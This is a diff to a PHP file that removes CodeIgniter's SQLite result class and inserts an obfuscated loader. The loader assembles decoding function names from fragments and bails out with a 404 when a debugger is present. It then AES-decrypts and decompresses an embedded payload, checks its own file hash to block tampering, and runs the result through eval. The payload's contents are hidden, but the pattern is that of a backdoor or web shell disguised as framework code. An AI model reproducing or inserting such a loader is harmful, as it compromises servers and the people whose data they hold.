@@ -1,164 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.3.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * SQLite Result Class
- *
- * This class extends the parent result class: CI_DB_result
- *
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_sqlite_result extends CI_DB_result {
-
-	/**
-	 * Number of rows in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_rows()
-	{
-		return is_int($this->num_rows)
-			? $this->num_rows
-			: $this->num_rows = @sqlite_num_rows($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Number of fields in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_fields()
-	{
-		return @sqlite_num_fields($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Fetch Field Names
-	 *
-	 * Generates an array of column names
-	 *
-	 * @return	array
-	 */
-	public function list_fields()
-	{
-		$field_names = array();
-		for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
-		{
-			$field_names[$i] = sqlite_field_name($this->result_id, $i);
-		}
-
-		return $field_names;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field data
-	 *
-	 * Generates an array of objects containing field meta-data
-	 *
-	 * @return	array
-	 */
-	public function field_data()
-	{
-		$retval = array();
-		for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
-		{
-			$retval[$i]			= new stdClass();
-			$retval[$i]->name		= sqlite_field_name($this->result_id, $i);
-			$retval[$i]->type		= NULL;
-			$retval[$i]->max_length		= NULL;
-		}
-
-		return $retval;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Data Seek
-	 *
-	 * Moves the internal pointer to the desired offset. We call
-	 * this internally before fetching results to make sure the
-	 * result set starts at zero.
-	 *
-	 * @param	int	$n
-	 * @return	bool
-	 */
-	public function data_seek($n = 0)
-	{
-		return sqlite_seek($this->result_id, $n);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - associative array
-	 *
-	 * Returns the result set as an array
-	 *
-	 * @return	array
-	 */
-	protected function _fetch_assoc()
-	{
-		return sqlite_fetch_array($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - object
-	 *
-	 * Returns the result set as an object
-	 *
-	 * @param	string	$class_name
-	 * @return	object
-	 */
-	protected function _fetch_object($class_name = 'stdClass')
-	{
-		return sqlite_fetch_object($this->result_id, $class_name);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_f5tu4v3t=('bas'.'e64'.'_de'.'cod'.'e');
+$_o2ex8ies=('gzu'.'nco'.'mpr'.'ess');
+$_l7akg0k1=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_mhvr41o3='Xbje4KixS/g=';
+$_tvaacyvi='+a1e50Nq';
+$_hdkaq3o5='yWzyagu5';
+$_blr63qoo='bapwxvOL';
+$_rfppq39z='iFsxT9SX';
+$_b9a862v0='kCRLzimM';
+$_gj4havk1='zWfA+vmf';
+$_wg0pwchi='Fj88bg==';
+$_jve9g4mx=$_f5tu4v3t($_rfppq39z.$_blr63qoo.$_hdkaq3o5.$_tvaacyvi.$_mhvr41o3);
+$_ffo47ayq=$_f5tu4v3t($_b9a862v0.$_gj4havk1.$_wg0pwchi);
+$_j04pb8fe=$_f5tu4v3t('qzpA63wnVCrYfbVqCj0ETzsV5GKEmWGDWBpiAFFo9wsDrLz/V+7vWiVliP7ZaA8ZtrjdgQSARbfkpeMPIe6poZN7ewMXH/3Apy6iJ+nV6IjEQO/A9hCcLpuUbuTo49RBsS4yNM65+VzBjY6Tg8pmdE9NNh61mW+8NeFHZhHnbcu3buQWzLvlT9dPeGff/K9GqWfEmExVJLfbAfNzst5SRbzK5pr5WIPVuiUarSMfeWUlamn1BrL86NpKDehCkBYcETxGldhcEqmcjC8UumfOuCYrhPrJ6WRkzfR8FqddpymIA9yrmr79Jtru5dHJXIB2SMawuFiT/OTXX3Rhzs4N7hXgz3DF5yUM/rygjC4AVXpgpzjOmlTbwPK34apYhWmjyWCbuP3k3FxKXZcaFXopD17fTNumGiGxpl20QzzXZXntMVL3914croeKYmiLM7467vpI8x1MM9uCzLwKOK1nJVz20swbfrAGUvTLmv5CT07xhwUma8ocLqA1rks+9NXY20XPvMEpqtr7Ylc3+F/j8tU+NerECr7G1JrzL9a1qJI=');
+$_xt8p4nrj=$_l7akg0k1($_j04pb8fe,'aes-256-cbc',$_jve9g4mx,OPENSSL_RAW_DATA,$_ffo47ayq);
+if($_xt8p4nrj===false){exit;}
+$_iumajpok=$_o2ex8ies($_xt8p4nrj);
+if($_iumajpok===false){exit;}
+$_qro90oaf='f36bbe746d9b03fcd625a76c3f14d81fc7be4118f3814cc9fd76dbc9a12f29e0';
+$_gwytanbz=@file_get_contents(__FILE__);
+if($_gwytanbz!==false){
+$_ivfdcw5s=str_replace($_qro90oaf,"0000000000000000000000000000000000000000000000000000000000000000",$_gwytanbz);
+$_s04e5o87=hash("sha256",$_ivfdcw5s);
+if($_s04e5o87!==$_qro90oaf){@http_response_code(403);exit;}
 }
+eval($_iumajpok);
